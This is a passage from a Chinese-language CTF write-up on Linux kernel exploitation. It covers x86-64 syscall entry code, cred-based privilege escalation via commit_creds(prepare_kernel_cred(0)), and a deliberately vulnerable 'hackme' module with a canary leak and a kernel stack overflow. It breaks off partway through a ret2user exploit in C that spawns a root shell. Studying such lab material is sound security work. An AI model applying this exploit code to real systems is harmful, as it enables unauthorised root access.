SYM_L_GLOBAL)</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Construct struct pt_regs on stack */</span></span><br><span class="line">	pushq	$__USER_DS				<span class="comment">/* pt_regs-&gt;ss */</span></span><br><span class="line">	pushq	PER_CPU_VAR(cpu_tss_rw + TSS_sp2)	<span class="comment">/* pt_regs-&gt;sp */</span></span><br><span class="line">	pushq	%r11					<span class="comment">/* pt_regs-&gt;flags */</span></span><br><span class="line">	pushq	$__USER_CS				<span class="comment">/* pt_regs-&gt;cs */</span></span><br><span class="line">	pushq	%rcx					<span class="comment">/* pt_regs-&gt;ip */</span></span><br><span class="line">SYM_INNER_LABEL(entry_SYSCALL_64_after_hwframe, SYM_L_GLOBAL)</span><br><span class="line">	pushq	%rax					<span class="comment">/* pt_regs-&gt;orig_ax */</span></span><br><span class="line"></span><br><span class="line">	PUSH_AND_CLEAR_REGS rax=$-ENOSYS</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* IRQs are off. */</span></span><br><span class="line">	movq	%rax, %rdi</span><br><span class="line">	movq	%rsp, %rsi</span><br><span class="line">	call	do_syscall_64		<span class="comment">/* returns with IRQs disabled */</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Try to use SYSRET instead of IRET if we&#x27;re returning to</span></span><br><span class="line"><span class="comment">	 * a completely clean 64-bit userspace context.  If we&#x27;re not,</span></span><br><span class="line"><span class="comment">	 * go to the slow exit path.</span></span><br><span class="line"><span class="comment">	 * In the Xen PV case we must use iret anyway.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line"></span><br><span class="line">	ALTERNATIVE <span class="string">&quot;&quot;</span>, <span class="string">&quot;jmp	swapgs_restore_regs_and_return_to_usermode&quot;</span>, \</span><br><span class="line">		X86_FEATURE_XENPV</span><br><span class="line"></span><br><span class="line">	movq	RCX(%rsp), %rcx</span><br><span class="line">	movq	RIP(%rsp), %r11</span><br><span class="line"></span><br><span class="line">	cmpq	%rcx, %r11	<span class="comment">/* SYSRET requires RCX == RIP */</span></span><br><span class="line">	jne	swapgs_restore_regs_and_return_to_usermode</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * On Intel CPUs, SYSRET with non-canonical RCX/RIP will #GP</span></span><br><span class="line"><span class="comment">	 * in kernel space.  This essentially lets the user take over</span></span><br><span class="line"><span class="comment">	 * the kernel, since userspace controls RSP.</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * If width of &quot;canonical tail&quot; ever becomes variable, this will need</span></span><br><span class="line"><span class="comment">	 * to be updated to remain correct on both old and new CPUs.</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * Change top bits to match most significant bit (47th or 56th bit</span></span><br><span class="line"><span class="comment">	 * depending on paging mode) in the address.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_X86_5LEVEL</span></span><br><span class="line">	ALTERNATIVE <span class="string">&quot;shl $(64 - 48), %rcx; sar $(64 - 48), %rcx&quot;</span>, \</span><br><span class="line">		<span class="string">&quot;shl $(64 - 57), %rcx; sar $(64 - 57), %rcx&quot;</span>, X86_FEATURE_LA57</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">	shl	$(<span class="number">64</span> - (__VIRTUAL_MASK_SHIFT+<span class="number">1</span>)), %rcx</span><br><span class="line">	sar	$(<span class="number">64</span> - (__VIRTUAL_MASK_SHIFT+<span class="number">1</span>)), %rcx</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* If this changed %rcx, it was not canonical */</span></span><br><span class="line">	cmpq	%rcx, %r11</span><br><span class="line">	jne	swapgs_restore_regs_and_return_to_usermode</span><br><span class="line"></span><br><span class="line">	cmpq	$__USER_CS, CS(%rsp)		<span class="comment">/* CS must match SYSRET */</span></span><br><span class="line">	jne	swapgs_restore_regs_and_return_to_usermode</span><br><span class="line"></span><br><span class="line">	movq	R11(%rsp), %r11</span><br><span class="line">	cmpq	%r11, EFLAGS(%rsp)		<span class="comment">/* R11 == RFLAGS */</span></span><br><span class="line">	jne	swapgs_restore_regs_and_return_to_usermode</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * SYSCALL clears RF when it saves RFLAGS in R11 and SYSRET cannot</span></span><br><span class="line"><span class="comment">	 * restore RF properly. If the slowpath sets it for whatever reason, we</span></span><br><span class="line"><span class="comment">	 * need to restore it correctly.</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * SYSRET can restore TF, but unlike IRET, restoring TF results in a</span></span><br><span class="line"><span class="comment">	 * trap from userspace immediately after SYSRET.  This would cause an</span></span><br><span class="line"><span class="comment">	 * infinite loop whenever #DB happens with register state that satisfies</span></span><br><span class="line"><span class="comment">	 * the opportunistic SYSRET conditions.  For example, single-stepping</span></span><br><span class="line"><span class="comment">	 * this user code:</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 *           movq	$stuck_here, %rcx</span></span><br><span class="line"><span class="comment">	 *           pushfq</span></span><br><span class="line"><span class="comment">	 *           popq %r11</span></span><br><span class="line"><span class="comment">	 *   stuck_here:</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * would never get past &#x27;stuck_here&#x27;.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	testq	$(X86_EFLAGS_RF|X86_EFLAGS_TF), %r11</span><br><span class="line">	jnz	swapgs_restore_regs_and_return_to_usermode</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* nothing to check for RSP */</span></span><br><span class="line"></span><br><span class="line">	cmpq	$__USER_DS, SS(%rsp)		<span class="comment">/* SS must match SYSRET */</span></span><br><span class="line">	jne	swapgs_restore_regs_and_return_to_usermode</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * We win! This label is here just for ease of understanding</span></span><br><span class="line"><span class="comment">	 * perf profiles. Nothing jumps here.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">syscall_return_via_sysret:</span><br><span class="line">	<span class="comment">/* rcx and r11 are already restored (see code above) */</span></span><br><span class="line">	POP_REGS pop_rdi=<span class="number">0</span> skip_r11rcx=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Now all regs are restored except RSP and RDI.</span></span><br><span class="line"><span class="comment">	 * Save old stack pointer and switch to trampoline stack.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	movq	%rsp, %rdi</span><br><span class="line">	movq	PER_CPU_VAR(cpu_tss_rw + TSS_sp0), %rsp</span><br><span class="line">	UNWIND_HINT_EMPTY</span><br><span class="line"></span><br><span class="line">	pushq	RSP-RDI(%rdi)	<span class="comment">/* RSP */</span></span><br><span class="line">	pushq	(%rdi)		<span class="comment">/* RDI */</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * We are on the trampoline stack.  All regs except RDI are live.</span></span><br><span class="line"><span class="comment">	 * We can do future final exit work right here.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	STACKLEAK_ERASE_NOCLOBBER</span><br><span class="line"></span><br><span class="line">	SWITCH_TO_USER_CR3_STACK scratch_reg=%rdi</span><br><span class="line"></span><br><span class="line">	popq	%rdi</span><br><span class="line">	popq	%rsp</span><br><span class="line">	swapgs</span><br><span class="line">	sysretq</span><br><span class="line">SYM_CODE_END(entry_SYSCALL_64)</span><br></pre></td></tr></table></figure>
+
+<p>执行完毕后使用sysretq返回到用户态</p>
+<p>在x64上有两种返回到用户态的命令</p>
+<p><code>sysret</code>和<code>iret</code></p>
+<p>注意到<code>x64</code>上<code>syscall</code>一开始和最后<code>sysret</code>之前, 都有一个<code>swapgs</code>, 这个指令也是<code>x64</code>独有的</p>
+<p><code>fs,gs</code>这两个段寄存器是<code>x86</code>上引入的两个附加段寄存器</p>
+<p><code>fs</code>用于在用户态的<code>glibc</code>中保存<code>TLS</code></p>
+<p><code>gs</code>用于在内核态保存<code>percpu</code>变量与<code>canary</code></p>
+<p><code>fs</code>在内核态无用,<code>gs</code>在用户态无效</p>
+<p><code>swapgs</code>中更换的<code>gs</code>来自于MSR寄存器</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20241120204022830.png" alt="image-20241120204022830"></p>
+<p>总是当前使用一个,然后MSR记住另一个</p>
+<h2 id="privilege-escalation"><a href="#privilege-escalation" class="headerlink" title="privilege escalation"></a>privilege escalation</h2><p>进程权限由<code>task_struct</code>的成员<code>struct cred *cred</code>控制</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; ptype <span class="class"><span class="keyword">struct</span> <span class="title">cred</span></span></span><br><span class="line"><span class="class"><span class="title">type</span> =</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> &#123;</span></span><br><span class="line">    <span class="type">atomic_t</span> usage;</span><br><span class="line">    <span class="type">kuid_t</span> uid;</span><br><span class="line">    <span class="type">kgid_t</span> gid;</span><br><span class="line">    <span class="type">kuid_t</span> suid;</span><br><span class="line">    <span class="type">kgid_t</span> sgid;</span><br><span class="line">    <span class="type">kuid_t</span> euid;</span><br><span class="line">    <span class="type">kgid_t</span> egid;</span><br><span class="line">    <span class="type">kuid_t</span> fsuid;</span><br><span class="line">    <span class="type">kgid_t</span> fsgid;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> securebits;</span><br><span class="line">    <span class="type">kernel_cap_t</span> cap_inheritable;</span><br><span class="line">    <span class="type">kernel_cap_t</span> cap_permitted;</span><br><span class="line">    <span class="type">kernel_cap_t</span> cap_effective;</span><br><span class="line">    <span class="type">kernel_cap_t</span> cap_bset;</span><br><span class="line">    <span class="type">kernel_cap_t</span> cap_ambient;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> jit_keyring;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span> *<span class="title">session_keyring</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span> *<span class="title">process_keyring</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span> *<span class="title">thread_keyring</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span> *<span class="title">request_key_auth</span>;</span></span><br><span class="line">    <span class="type">void</span> *security;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span> *<span class="title">user</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_namespace</span> *<span class="title">user_ns</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">group_info</span> *<span class="title">group_info</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        <span class="type">int</span> non_rcu;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">callback_head</span> <span class="title">rcu</span>;</span></span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>想要提升一个普通进程的权限到<code>root</code>, 可以找一个<code>root</code>进程的<code>cred</code>抄过来</p>
+<p>修改进程<code>cred</code>的方法:</p>
+<p>1.要么构造<code>rop</code>链调用内核函数<code>commit_creds(&amp;init_cred);</code>,抄<code>init</code>进程的<code>cred</code>替换当前进程的</p>
+<p>2.要么有一个内核内存任意写的利用原语, 找到当前进程<code>task_struct</code>, 然后找到<code>cred</code> , 然后修改之</p>
+<h3 id="commit-creds-init-cred"><a href="#commit-creds-init-cred" class="headerlink" title="commit_creds(&amp;init_cred);"></a>commit_creds(&amp;init_cred);</h3><p>这就有一个问题,怎么才能找到<code>init</code>进程的<code>cred</code>?</p>
+<p>怎么才能找到<code>struct init_task</code>?</p>
+<p><code>Linux 6.2</code>之前有另一个函数<code>prepare_kernel_cred</code>给我们代劳</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> cred *<span class="title function_">prepare_kernel_cred</span><span class="params">(<span class="keyword">struct</span> task_struct *daemon)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">old</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">new</span>;</span></span><br><span class="line"></span><br><span class="line">    new = kmem_cache_alloc(cred_jar, GFP_KERNEL);</span><br><span class="line">    <span class="keyword">if</span> (!new)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    kdebug(<span class="string">&quot;prepare_kernel_cred() alloc %p&quot;</span>, new);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (daemon)</span><br><span class="line">        old = get_task_cred(daemon);</span><br><span class="line">    <span class="keyword">else</span>	<span class="comment">//daemon == NULL时返回init_cred</span></span><br><span class="line">        old = get_cred(&amp;init_cred);</span><br></pre></td></tr></table></figure>
+
+<p>当参数为<code>NULL</code>时, 该函数返回<code>init_cred</code>,也就是<code>init_task</code>的<code>cred</code></p>
+<p>因此可以构造堆栈<code>rop</code>链:</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/elevation-of-privilege.png" alt="commit_creds(prepare_kernel_cred(NULL))"></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="literal">NULL</span> =&gt; rdi</span><br><span class="line">prepare_kernel_cred(rdi) =&gt; rax</span><br><span class="line">rax =&gt; rdi</span><br><span class="line">commit_creds(rdi)</span><br></pre></td></tr></table></figure>
+
+
+
+<p>但是<code>Linux 6.2</code>及之后如果参数为<code>NULL</code>则直接返回<code>NULL</code>了, 叫没法空手套白狼了</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> cred *<span class="title function_">prepare_kernel_cred</span><span class="params">(<span class="keyword">struct</span> task_struct *daemon)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">old</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">new</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (WARN_ON_ONCE(!daemon))</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    new = kmem_cache_alloc(cred_jar, GFP_KERNEL);</span><br><span class="line">    <span class="keyword">if</span> (!new)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+
+
+<h2 id="vulnerability-kernel-module"><a href="#vulnerability-kernel-module" class="headerlink" title="vulnerability kernel module"></a>vulnerability kernel module</h2><p>题目所给的内核模块<code>hackme.ko</code></p>
+<p>模块的初始化函数中调用<code>misc_register</code>函数注册了一个<code>struct miscdevice </code>字符杂项设备</p>
+<blockquote>
+<p>字符杂项设备</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">miscdevice</span>&#123;</span></span><br><span class="line">　　<span class="type">int</span> minor; <span class="comment">//杂项设备的此设备号(如果设置为MISC_DYNAMIC_MINOR，表示系统自动分配未使用的minor)</span></span><br><span class="line">　　<span class="type">const</span> <span class="type">char</span> *name;		<span class="comment">// /dev目录下的节点名称</span></span><br><span class="line">　　<span class="type">const</span> stuct file_operations *fops;<span class="comment">//驱动主题函数入口指针</span></span><br><span class="line">　　<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">list</span>;</span></span><br><span class="line">　　<span class="class"><span class="keyword">struct</span> <span class="title">device</span> *<span class="title">parent</span>;</span></span><br><span class="line">　　<span class="class"><span class="keyword">struct</span> <span class="title">device</span> *<span class="title">this_device</span>;</span></span><br><span class="line">　　<span class="type">const</span> <span class="type">char</span> *nodename;<span class="comment">//</span></span><br><span class="line">　　<span class="type">mode_t</span> mode;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>字符杂项设备的主设备号自动被设置为<code>10</code>, 次设备号由<code>minor</code>字段定义</p>
+<p><code>misc_register</code>注册字符杂项设备时会自动在<code>/dev/</code>下创建设备节点文件, 节点文件名由<code>name</code>字段给出, <code>nodename</code>表示<code>/dev/下</code>的二级目录, 如果<code>nodename</code>非空则创建节点文件<code>/dev/&lt;nodename&gt;/name</code></p>
+</blockquote>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">.data:<span class="number">0000000000000440</span> hackme_misc     dd <span class="number">0F</span>Fh                 ; minor</span><br><span class="line">.data:<span class="number">0000000000000440</span>                                         ; DATA XREF: hackme_init+<span class="number">6</span>↑o</span><br><span class="line">.data:<span class="number">0000000000000440</span>                                         ; hackme_exit+<span class="number">1</span>↑o</span><br><span class="line">.data:<span class="number">0000000000000440</span>                 db <span class="number">4</span> dup(<span class="number">0</span>)             ; <span class="string">&quot;hackme&quot;</span></span><br><span class="line">.data:<span class="number">0000000000000440</span>                 dq offset aHackme       ; name</span><br><span class="line">.data:<span class="number">0000000000000440</span>                 dq offset hackme_fops   ; fops</span><br><span class="line">.data:<span class="number">0000000000000440</span>                 dq <span class="number">0</span>                    ; <span class="built_in">list</span>.next</span><br><span class="line">.data:<span class="number">0000000000000440</span>                 dq <span class="number">0</span>                    ; <span class="built_in">list</span>.prev</span><br><span class="line">.data:<span class="number">0000000000000440</span>                 dq <span class="number">0</span>                    ; parent</span><br><span class="line">.data:<span class="number">0000000000000440</span>                 dq <span class="number">0</span>                    ; this_device</span><br><span class="line">.data:<span class="number">0000000000000440</span>                 dq <span class="number">0</span>                    ; groups</span><br><span class="line">.data:<span class="number">0000000000000440</span>                 dq <span class="number">0</span>                    ; nodename</span><br><span class="line">.data:<span class="number">0000000000000440</span>                 dw <span class="number">0</span>                    ; mode</span><br><span class="line">.data:<span class="number">0000000000000440</span>                 db <span class="number">6</span> dup(<span class="number">0</span>)</span><br><span class="line">.data:<span class="number">0000000000000440</span> _data           ends</span><br></pre></td></tr></table></figure>
+
+<p>其中<code>fops</code>是一个自定义的设备行为指针表</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.rodata:<span class="number">0000000000000320</span> hackme_fops     file_operations &lt;offset __this_module, <span class="number">0</span>, offset hackme_read, \</span><br><span class="line">.rodata:<span class="number">0000000000000320</span>                                         ; DATA XREF: .data:hackme_misc↓o</span><br><span class="line">.rodata:<span class="number">0000000000000320</span>                                  offset hackme_write, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, \</span><br><span class="line">.rodata:<span class="number">0000000000000320</span>                                  offset hackme_open, <span class="number">0</span>, offset hackme_release, <span class="number">0</span>, <span class="number">0</span>, \</span><br><span class="line">.rodata:<span class="number">0000000000000320</span>                                  <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>&gt;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到自定义了<code>read,write,open,release</code>四种行为</p>
+<p>在<code>hackme_read</code>中发生了这么一个事:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kstack_buf1[0:size]@kernel stack  =&gt;  hackme_buf@kernel bss  =&gt;  user_data@user </span><br></pre></td></tr></table></figure>
+
+<p>由于<code>size</code>由用户指定,因此这里可以泄露内核堆栈上的<code>canary</code>,以及函数返回地址,以此可以绕过<code>KASLR</code></p>
+<p>在<code>hackme_write</code>中发生了这么一个事:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user_data[0:size]@user  =&gt;  hackme_buf@kernel bss  =&gt;  kstack_buf2@kernel stack </span><br></pre></td></tr></table></figure>
+
+<p>由于<code>size</code>由用户指定,因此这里可以往内核堆栈写入任意字节,存在堆栈溢出,可以构造<code>ROP</code>链</p>
+<p>思路:</p>
+<p>1.在hackme_read中泄露canary与返回地址, 绕过KASLR</p>
+<p>2.在hackme_write中堆栈溢出, 构造ROP链</p>
+<h2 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h2><h3 id="ret2user"><a href="#ret2user" class="headerlink" title="ret2user"></a>ret2user</h3><p>假设我们关闭<code>smap,smep,kpti,kaslr,</code> 只考虑绕过<code>canary</code></p>
+<p>1.利用<code>hackme_read</code>泄露<code>canary</code></p>
+<p>2.利用<code>hackme_write</code>绕过<code>canary</code>检查,继续溢出内核堆栈,构造<code>rop</code>链条</p>
+<p>3.更换进程<code>creds</code>提权, 也就是执行</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">commit_creds(prepare_kernel_cred(<span class="number">0</span>));</span><br></pre></td></tr></table></figure>
+
+<p>在用户程序中写<code>shellcode</code>实现, 然后在<code>rop</code>链条中<code>ret2shellcode</code></p>
+<p>4.返回到用户态</p>
+<p>也就是执行<code>iret</code></p>
+<p>在用户程序中写<code>shellcode</code>实现</p>
+<p>5.起<code>shell</code></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//未开启KASLR时,两个函数的地址</span></span><br><span class="line"><span class="type">size_t</span> addr_commit_creds = <span class="number">0xffffffff814c6410</span>;</span><br><span class="line"><span class="type">size_t</span> addr_prepare_kernel_cred = <span class="number">0xffffffff814c67f0</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> dev_fd;</span><br><span class="line"><span class="type">size_t</span> canary;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_cs;</span><br><span class="line"><span class="type">size_t</span> user_ss;</span><br><span class="line"><span class="type">size_t</span> user_sp;</span><br><span class="line"><span class="type">size_t</span> user_rflags;</span><br><span class="line"><span class="type">size_t</span> user_rip;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">save_state</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">open_dev</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">leak_canary</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">overflow</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">spawn_shell</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">privilege_escalation</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    save_state();   <span class="comment">//保存进入内核之前的用户态上下文</span></span><br><span class="line">    open_dev();     <span class="comment">//打开设备</span></span><br><span class="line">    leak_canary();  <span class="comment">//泄露canary</span></span><br><span class="line">    overflow();     <span class="comment">//溢出,绕过canary,构造rop链</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[!] should never be reached&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">open_dev</span><span class="params">()</span>&#123;</span><br><span class="line">    dev_fd = open(<span class="string">&quot;/dev/hackme&quot;</span>,O_RDWR);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">spawn_shell</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> *argv[] = &#123;<span class="string">&quot;/bin/sh&quot;</span>, <span class="literal">NULL</span>&#125;;</span><br><span class="line">    execve(argv[<span class="number">0</span>], argv, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">save_state</span><span class="params">()</span>&#123;</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;.intel_syntax noprefix;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">        <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">        <span class="string">&quot;pop 